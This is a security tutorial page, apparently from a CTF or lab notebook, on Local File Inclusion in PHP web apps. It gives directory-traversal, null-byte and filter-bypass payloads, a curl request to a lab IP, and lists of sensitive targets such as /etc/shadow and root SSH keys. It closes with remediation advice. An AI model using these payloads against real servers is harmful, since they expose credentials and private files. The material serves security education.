---
description: >-
  LFI occurs when a web application allows user input to include files on the
  server without proper validation. The goal is to manipulate the input
  parameter to include sensitive files or files that can
---

# Local File Inclusion (LFI)

The most common place we usually find LFI within is templating engines. In order to have most of the web application looking the same when navigating between pages, a templating engine displays a page that shows the common static parts, such as the `header`, `navigation bar`, and `footer`, and then dynamically loads other content that changes between pages. Otherwise, every page on the server would need to be modified when changes are made to any of the static parts. This is why we often see a parameter like `/index.php?page=about`, where `index.php` sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called `about.php`. As we have control over the `about` portion of the request, it may be possible to have the web application grab other files and display them on the page.

<figure><img src="../../../../../../../.gitbook/assets/45d9c1baacda290c1f95858e27f740c9.png" alt=""><figcaption></figcaption></figure>

**We add  `../../../`   depending on how deep we are.**

**Example Vulnerable URL:**

```bash
http://example.com/index.php?page=about
```

In this case, the application might be including a file called `about.php`, but the attacker can modify the `page` parameter to include files from the server.

**Basic LFI Payload:**

```bash
http://example.com/index.php?page=../../../../etc/passwd
```

This attempts to read the **`/etc/passwd`** file (on Unix-based systems), which contains user account information.

| **Location**                  | **Description**                                                                                                                                                   |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/etc/issue`                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| `/etc/profile`                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| `/proc/version`               | specifies the version of the Linux kernel                                                                                                                         |
| `etc/passwd`                  | has all registered users that have access to a system                                                                                                             |
| `/etc/shadow`                 | contains information about the system's users' passwords                                                                                                          |
| `/root/.bash_history`         | contains the history commands for `root` user                                                                                                                     |
| `/var/log/dmessage`           | contains global system messages, including the messages that are logged during system startup                                                                     |
| `/var/mail/root`              | all emails for `root` user                                                                                                                                        |
| `/root/.ssh/id_rsa`           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| `/var/log/apache2/access.log` | the accessed requests for `Apache` web server                                                                                                                     |
| `C:\boot.ini`                 | contains the boot options for computers with BIOS firmware                                                                                                        |

***

## **LFI Techniques**

**Directory Traversal (Dot-Dot-Slash)**

* **Goal**: Use `../` (dot-dot-slash) to traverse up the directory structure and access files outside the web root.
*   **Example**:

    ```bash
    ../../../../etc/passwd
    ```

**Null Byte Injection (Legacy Vulnerability)**

Some web applications may incorrectly handle file paths containing a null byte (`%00`), terminating the file path and ignoring the extension (e.g., `.php`, `.txt`).

**Example** (Legacy Vulnerability):

```
../../../../etc/passwd%00
```

This may bypass security checks by terminating the file extension.

**Adding** `%00`

{% hint style="warning" %}
When adding %00 it bypass webserver file exnstion reqeust even if we type etc/pawssd the server may request like etc/passwd.**php** but we dont want to request a file but a directory so we use null byte to bypass server redircet filter
{% endhint %}

**Request**

```
curl -X POST http://10.10.146.144/challenges/chall1.php -d 'method=GET&file=/etc/flag1'
```

**Header parameters**

```
Cookie=THM-ADMIN to Cookie=../etc/passwd%00 null to bypass extension
```

**Bypassing filter**

```
....//....//...//....//etc/passwd or ..//..//..//..//etc/passwd
```

{% hint style="warning" %}
we use four dots becuase the website filter the request and when it sees two dots it remove them
{% endhint %}

***

## **Linux Systems**:

* `/etc/passwd`: User account details (on Linux/Unix).
* `/etc/shadow`: Password hashes (if accessible).
* `/etc/hostname`: Hostname of the machine.
* `/var/log/apache2/access.log`: Web server access logs.
* `/var/log/syslog`: System logs.
* `/etc/nginx/nginx.conf`: Nginx configuration file.
* `/proc/self/environ`: Environment variables of the current process.

## **Windows Systems**:

* `C:\Windows\System32\drivers\etc\hosts`
* `C:\xampp\htdocs\phpmyadmin\config.inc.php`
* `C:\Windows\win.ini`

## Remediation

As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:

1. Keep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow\_url\_fopen on and allow\_url\_include.
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.
